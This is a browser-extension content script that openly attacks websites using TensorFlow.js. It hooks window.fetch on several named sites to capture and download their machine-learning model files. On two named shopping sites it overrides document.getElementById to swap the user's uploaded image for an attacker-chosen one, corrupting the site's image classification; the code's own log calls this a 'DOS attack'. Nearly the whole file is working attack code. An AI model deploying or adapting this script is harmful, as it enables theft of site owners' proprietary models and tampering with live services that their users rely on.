const injectedJS = `
    console.log('This works!');        
    const addTFJS = function() {
        console.log('Injecting tfjs in case its not already done by the victim');
        var scripts = document.scripts;
        var found = false;
        for(let element of scripts) {
            if(element.src.includes('tfjs')) {
                console.log('TFJS found on the webpage -'+ element.src);
                found = true;
            }
        }

        if(!found) {
            add();
        }

        try {
            
            if(tf) {
                console.log('tf detected');
            } 
        } catch(err) {
            console.log('tf not detected, adding it');
            add();
        }
    }

    function add() {
        var scriptTFJS = document.createElement('script');
        console.log('Injected TFJS to the target page');
        scriptTFJS.src = 'https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@1.5.2';
        scriptTFJS.id = Date();
        scriptTFJS.type = 'text/javascript';
        (document.head || document.documentElement).appendChild(scriptTFJS);
    }


    const originalFetch = window.fetch;
    myFetch = function() {
        console.log(arguments);
        return new Promise((resolve, reject) => {
            originalFetch.apply(this, arguments)
                .then((response) => {                    
                    console.log('From injected Script');                    
                    console.log(response);                    
                    if( (''+response.url).toLowerCase().includes('model') && response.url.includes('.json')) {
                        console.log('Model Extracted');
                        const responseClone = response.clone();
                        responseClone.json().then(p=> {
                            const strResponse = JSON.stringify(p);
                            const modelJson = strResponse;                            
                            var modelOut = {};
                            addTFJS();
                            if(tf) {
                                window.error = undefined;                                
                                window.fetch = originalFetch;
                                tf.loadGraphModel(response.url)
                                .then(model=> { 
                                    console.log(model);
                                    modelOut = model;
                                    modelOut.save('downloads://extractedModel'); 
                                    window.fetch = myFetch;
                                })
                                .catch(err => { 
                                    console.log("Unable to cast as graph model"); 
                                    tf.loadLayersModel(response.url)
                                    .then(model=> {
                                         console.log(model);
                                         modelOut = model;
                                         modelOut.save('downloads://extractedModel'); 
                                         window.fetch = myFetch;
                                    })
                                    .catch(err => {
                                        console.log("Unable to cast as layers model:" + err);                                        
                                        window.fetch = myFetch;
                                    });
                                });                                                       
                            } else {
                                console.log('TF not found');
                            }

                            localStorage.setItem('extractedModel', strResponse);
                        });                        
                    }                    
                    resolve(response);
                })
                .catch((error) => {
                    reject(response);
                })
        });
    }
    window.fetch = myFetch;
`;

if(document.URL.includes('modeliza.me') || document.URL.includes('pose-animator-demo') || document.URL.includes('cris-maillo')
     || document.URL.includes('modeldepot') || document.URL.includes('donottouchyourface')) {
    var scriptTFJS = document.createElement('script');
    console.log('Injected TFJS to the target page');
    scriptTFJS.src = 'https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@latest';
    scriptTFJS.id = Date();
    scriptTFJS.type = 'text/javascript';
    (document.head || document.documentElement).appendChild(scriptTFJS);
}


var scriptForFetch = document.createElement('script');
scriptForFetch.textContent = injectedJS;
(document.head || document.documentElement).appendChild(scriptForFetch);


chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        console.log(request);
});

Element.prototype.remove = function() {
    this.parentElement.removeChild(this);
}
NodeList.prototype.remove = HTMLCollection.prototype.remove = function() {
    for(var i = this.length - 1; i >= 0; i--) {
        if(this[i] && this[i].parentElement) {
            this[i].parentElement.removeChild(this[i]);
        }
    }
}

if((document.URL.includes('admiral-ng') && !document.URL.includes('search')) || (document.URL.includes('shopndesign') && !document.URL.includes('search')) ) {
    var moreInjections = `
    console.log('Executing DOS attack');
    window.document.original = window.document.getElementById;
    window.document.getElementById = function (str) {        
        if(str.includes('uploaded-image-url')) { 
            var img = document.createElement('img');
            img.id = 'uploaded-image-url';
            img.crossOrigin = 'Anonymous';
            img.src = 'https://assets.burberry.com/is/image/Burberryltd/d6e2f775f98b3f5d48b3bca7ccb3f3ad00906450.jpg';
            if(mobilenet) {
                mobilenet.load().then(p => {
                    var result = p.classify(img);
                    var queryString = '';
                    var analysedResult = [];
                    result.forEach(function(value) {
                        queryString = value.className.split(',');

                        if (queryString.length > 1) {
                            analysedResult = analysedResult.concat(queryString)
                        } else {
                            analysedResult.push(queryString[0])
                        }
                    });
                    queryString = localStorage.searched_terms = analysedResult.join('_');
                });
            }
            return img;
        } else return window.document.original(str); 
    };
    window.document.getElementById('uploaded-image-url');
    `;
    var scriptForDOS = document.createElement('script');
    scriptForDOS.textContent = moreInjections;
    (document.head || document.documentElement).appendChild(scriptForDOS);
}

console.log('End');